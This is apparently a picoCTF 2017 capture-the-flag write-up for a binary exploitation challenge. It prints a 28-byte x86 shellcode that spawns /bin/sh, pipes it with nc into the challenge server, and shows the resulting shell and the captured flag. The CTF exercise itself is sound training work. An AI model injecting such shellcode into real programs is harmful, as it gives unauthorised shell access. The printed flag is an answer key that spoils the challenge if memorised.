# Shellz
```
You no longer have an easy thing to call, but you have more space. Program: shellz! Source. Connect on shell2017.picoctf.com:23459.
HINTS
There is a bunch of preexisting shellcode already out there!
```

The program runs the 40 bytes worth of binary instructions that are entered by the user. We simply need to inject a shellcode that executes /bin/sh that is less than 40 bytes. There exist many premade shellcodes. We chose to use a 28 byte one from this link. 
[http://shell-storm.org/shellcode/files/shellcode-811.php](http://shell-storm.org/shellcode/files/shellcode-811.php)

Using python we can or echo -e we can pipe the shellcode into the program. We will however have to do 2 other things. We will have to evaluate pass stdin back to the process with 'cat' followed by no arguments and evaluate our expression before piping it in. The command takes the following format in the end.

```
(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"; cat) | nc shell2017.picoctf.com 23459
```

After executing this command we are left with a shell on their server and we simply need to cat the flag.

```
python -c "print len('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"
28
robbie@debian-server:~/PicoCTF2017/binary_exploitation/level2/shellz$ ./get_shell.sh
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
cat flag.txt
5b5ba2c3b5558ec86315fd52b0c55a87
```
